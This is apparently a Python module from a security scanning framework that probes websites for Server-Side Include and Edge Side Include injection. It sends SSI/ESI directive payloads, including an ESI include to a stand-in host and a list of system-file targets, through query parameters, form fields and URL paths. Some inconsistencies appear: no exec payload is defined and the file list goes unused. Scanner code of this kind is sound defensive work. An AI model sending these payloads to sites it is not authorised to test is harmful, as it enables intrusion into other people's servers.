"""SSI Injection — Server-Side Include and ESI injection vulnerability scanner.

SSI (Server-Side Includes) allows executing directives embedded in HTML pages
processed by Apache/nginx. ESI (Edge Side Includes) affects Varnish, Squid,
Akamai. Both can lead to RCE, file inclusion, and SSRF.

Probes: <!--#echo var="DATE_LOCAL"-->, <!--#exec cmd="id"-->, ESI tags,
and reflected SSI in form fields and URL parameters.
"""

from __future__ import annotations

import asyncio
import re
from typing import Any
from urllib.parse import urlparse, urlencode

import httpx
import structlog

from src.adapters.scanners.base import BaseOsintScanner
from src.core.domain.entities.types import ScanInputType

log = structlog.get_logger()

# SSI payloads — ordered from safe (echo) to dangerous (exec)
_SSI_PAYLOADS: list[tuple[str, str, str]] = [
    # (payload, detection_pattern, technique)
    ('<!--#echo var="DATE_LOCAL"-->', r'\d{2,4}[-/]\d{2}[-/]\d{2,4}|\w{3,9}\s+\d+', "ssi_echo_date"),
    ('<!--#echo var="DOCUMENT_NAME"-->', r'\.(html|htm|shtml|php|asp)', "ssi_echo_docname"),
    ('<!--#echo var="SERVER_NAME"-->', r'[\w.-]+\.\w{2,}', "ssi_echo_server"),
    ('<!--#printenv-->', r'(SERVER_|HTTP_|DOCUMENT_)', "ssi_printenv"),
    ('<!--#config errmsg="SSI_PROBE_ACTIVE"-->', r'SSI_PROBE_ACTIVE', "ssi_config"),
    # ESI payloads (Varnish/Squid/Akamai)
    ('<esi:include src="https://evil.example.com/esi-probe"/>', r'esi.probe|esi:include', "esi_include"),
    ('<esi:vars>$(HTTP_HOST)</esi:vars>', r'[\w.-]+\.\w{2,}', "esi_vars"),
    ('<esi:debug/>', r'esi|debug', "esi_debug"),
    # Blind probe with unique marker
    ('<!--#if expr="1" -->SSIGOT<!--#endif-->', r'SSIGOT', "ssi_conditional"),
]

# Params to inject SSI into
_INJECTABLE_PARAMS: list[str] = [
    "name", "username", "user", "q", "search", "query",
    "message", "comment", "content", "text", "subject",
    "title", "desc", "description", "input",
    "page", "file", "path",
]

# Paths where SSI might be processed
_SSI_PATHS: list[str] = [
    "/", "/index.shtml", "/index.html", "/index.htm",
    "/search", "/search.shtml",
    "/contact", "/feedback",
    "/comment", "/post",
]

# SSI file targets (for exec detection)
_SSI_FILES = ["/etc/passwd", "/etc/hostname", "C:\\\\Windows\\\\win.ini"]

# Apache/nginx SSI indicators in response headers
_SSI_HEADERS = re.compile(r'(?i)(mod_include|ssi|shtml)', re.I)


class SSIInjectionScanner(BaseOsintScanner):
    """Server-Side Include (SSI) and Edge Side Include (ESI) injection scanner.

    Injects SSI/ESI directives in URL parameters, form fields, and path segments.
    Detects successful execution via date echoing, environment variable disclosure,
    and conditional processing markers.
    """

    scanner_name = "ssi_injection"
    supported_input_types = frozenset({ScanInputType.DOMAIN, ScanInputType.URL})
    cache_ttl = 3600
    scan_timeout = 60

    async def _do_scan(self, input_value: str, input_type: ScanInputType) -> dict[str, Any]:
        base_url = _normalise_url(input_value, input_type)
        return await self._manual_scan(base_url, input_value)

    async def _manual_scan(self, base_url: str, input_value: str) -> dict[str, Any]:
        vulnerabilities: list[dict[str, Any]] = []
        identifiers: list[str] = []

        async with httpx.AsyncClient(
            timeout=8,
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "Mozilla/5.0 (compatible; SSIScanner/1.0)"},
        ) as client:
            semaphore = asyncio.Semaphore(8)

            # Check server headers for SSI indicators
            try:
                resp = await client.get(base_url)
                if _SSI_HEADERS.search(str(resp.headers)):
                    identifiers.append("info:ssi:server_supports_ssi")
            except Exception:
                pass

            # Test GET parameter injection
            async def test_get_param(path: str, param: str, payload: str, detection: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path + "?" + urlencode({param: payload})
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        if re.search(detection, body):
                            vulnerabilities.append({
                                "type": "ssi_injection",
                                "severity": "critical" if "exec" in technique else "high",
                                "url": url,
                                "parameter": param,
                                "payload": payload[:80],
                                "technique": technique,
                                "evidence": re.search(detection, body).group(0)[:60],
                                "description": f"SSI injection via GET parameter '{param}' — directive executed",
                                "remediation": "Disable SSI/mod_include; sanitize user input before reflection",
                            })
                            ident = f"vuln:ssi:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Test POST injection
            async def test_post_param(path: str, param: str, payload: str, detection: str, technique: str) -> None:
                async with semaphore:
                    url = base_url.rstrip("/") + path
                    try:
                        resp = await client.post(url, data={param: payload})
                        body = resp.text
                        if re.search(detection, body):
                            vulnerabilities.append({
                                "type": "ssi_injection_post",
                                "severity": "critical" if "exec" in technique else "high",
                                "url": url,
                                "parameter": param,
                                "technique": technique,
                                "evidence": re.search(detection, body).group(0)[:60],
                                "description": f"SSI injection via POST parameter '{param}'",
                            })
                            ident = f"vuln:ssi:post:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            # Test path injection
            async def test_path_injection(payload: str, detection: str, technique: str) -> None:
                async with semaphore:
                    encoded = payload.replace(" ", "%20").replace("#", "%23").replace("!", "%21")
                    url = base_url.rstrip("/") + "/" + encoded
                    try:
                        resp = await client.get(url)
                        body = resp.text
                        if re.search(detection, body):
                            vulnerabilities.append({
                                "type": "ssi_path_injection",
                                "severity": "high",
                                "url": url,
                                "technique": technique,
                                "evidence": re.search(detection, body).group(0)[:60],
                                "description": "SSI injection via URL path segment",
                            })
                            ident = f"vuln:ssi:path:{technique}"
                            if ident not in identifiers:
                                identifiers.append(ident)
                    except Exception:
                        pass

            tasks = []
            for path in _SSI_PATHS[:4]:
                for param in _INJECTABLE_PARAMS[:6]:
                    for payload, detection, technique in _SSI_PAYLOADS[:5]:
                        tasks.append(test_get_param(path, param, payload, detection, technique))
                        tasks.append(test_post_param(path, param, payload, detection, technique))

            for payload, detection, technique in _SSI_PAYLOADS[:3]:
                tasks.append(test_path_injection(payload, detection, technique))

            await asyncio.gather(*tasks)

        severity_counts: dict[str, int] = {}
        for v in vulnerabilities:
            s = v.get("severity", "info")
            severity_counts[s] = severity_counts.get(s, 0) + 1

        return {
            "input": input_value,
            "scan_mode": "manual_fallback",
            "base_url": base_url,
            "vulnerabilities": vulnerabilities,
            "total_found": len(vulnerabilities),
            "severity_summary": severity_counts,
            "extracted_identifiers": identifiers,
        }

    def _extract_identifiers(self, raw_data: dict[str, Any]) -> list[str]:
        return raw_data.get("extracted_identifiers", [])


def _normalise_url(value: str, input_type: ScanInputType) -> str:
    if input_type == ScanInputType.DOMAIN:
        return f"https://{value}"
    if not value.startswith(("http://", "https://")):
        return f"https://{value}"
    return value
